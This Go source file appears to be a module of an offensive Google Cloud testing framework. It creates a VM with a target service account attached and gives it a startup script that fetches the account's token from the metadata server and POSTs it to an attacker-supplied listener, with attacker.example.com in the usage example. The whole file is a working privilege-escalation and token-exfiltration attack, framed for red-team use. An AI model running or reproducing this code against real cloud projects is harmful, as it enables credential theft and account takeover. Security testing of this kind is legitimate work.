package compute

import (
	"context"
	"fmt"

	computev1 "google.golang.org/api/compute/v1"

	"github.com/user/nimbus/internal/module"
	"github.com/user/nimbus/internal/output"
)

func init() {
	module.Register(&EscalateCreateInstance{})
}

// EscalateCreateInstance creates a new VM with a target SA and a startup script
// that exfiltrates the SA token to an attacker-controlled endpoint.
type EscalateCreateInstance struct{}

func (m *EscalateCreateInstance) Info() module.Info {
	return module.Info{
		Name:         "privesc.compute.escalate-create-instance",
		Tactic:       module.TacticPrivesc,
		Service:      "compute",
		Description:  "Create a VM with a target SA attached and exfiltrate its token via startup script",
		RequiresAuth: true,
		AttackID:     "T1578.002",
	}
}

func (m *EscalateCreateInstance) Run(ctx module.RunContext) error {
	targetSA := ctx.Flags["target-sa"]
	listener := ctx.Flags["listener"]

	if targetSA == "" || listener == "" {
		output.Warn("Usage: run privesc.compute.escalate-create-instance --target-sa <sa-email> --listener <attacker-url> [--zone <zone>]")
		output.Info("Example: --target-sa admin@project.iam.gserviceaccount.com --listener https://attacker.example.com/token --zone us-central1-a")
		return nil
	}

	zone := ctx.Flags["zone"]
	if zone == "" {
		zone = "us-central1-a"
	}

	project := ""
	if len(ctx.Projects) > 0 {
		project = ctx.Projects[0]
	}
	if project == "" {
		output.Warn("No project specified.")
		return nil
	}

	svc, err := computev1.NewService(context.Background(), ctx.Session.ClientOption())
	if err != nil {
		return fmt.Errorf("create compute client: %w", err)
	}

	instanceName := "nimbus-escalate-" + zone

	startupScript := fmt.Sprintf(
		"#!/bin/bash\ncurl -s -X POST -d \"$(curl -s -H 'Metadata-Flavor: Google' http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token)\" %s",
		listener,
	)

	output.Warn("Creating instance %s in %s/%s with SA %s", instanceName, project, zone, targetSA)
	output.Info("Startup script will POST metadata token to: %s", listener)

	instance := &computev1.Instance{
		Name:        instanceName,
		MachineType: fmt.Sprintf("zones/%s/machineTypes/e2-micro", zone),
		Disks: []*computev1.AttachedDisk{
			{
				AutoDelete: true,
				Boot:       true,
				InitializeParams: &computev1.AttachedDiskInitializeParams{
					SourceImage: "projects/debian-cloud/global/images/family/debian-12",
				},
			},
		},
		NetworkInterfaces: []*computev1.NetworkInterface{
			{
				Network: "global/networks/default",
				AccessConfigs: []*computev1.AccessConfig{
					{
						Name: "External NAT",
						Type: "ONE_TO_ONE_NAT",
					},
				},
			},
		},
		ServiceAccounts: []*computev1.ServiceAccount{
			{
				Email:  targetSA,
				Scopes: []string{"https://www.googleapis.com/auth/cloud-platform"},
			},
		},
		Metadata: &computev1.Metadata{
			Items: []*computev1.MetadataItems{
				{
					Key:   "startup-script",
					Value: &startupScript,
				},
			},
		},
	}

	op, err := svc.Instances.Insert(project, zone, instance).Do()
	if err != nil {
		return fmt.Errorf("create instance: %w", err)
	}

	output.Success("Instance creation initiated: %s (operation: %s)", instanceName, op.Name)
	output.Info("The startup script will exfiltrate the SA token on first boot.")
	output.Info("Clean up: gcloud compute instances delete %s --zone %s --project %s", instanceName, zone, project)

	if ctx.Findings != nil {
		ctx.Findings <- module.Finding{
			Module:      "privesc.compute.escalate-create-instance",
			Severity:    module.SevCritical,
			Title:       "Created VM with target SA for token exfiltration",
			Description: fmt.Sprintf("Created instance %s in %s/%s with SA %s; startup script exfiltrates token to %s", instanceName, project, zone, targetSA, listener),
			Resource:    instanceName,
			Project:     project,
		}
	}

	return nil
}
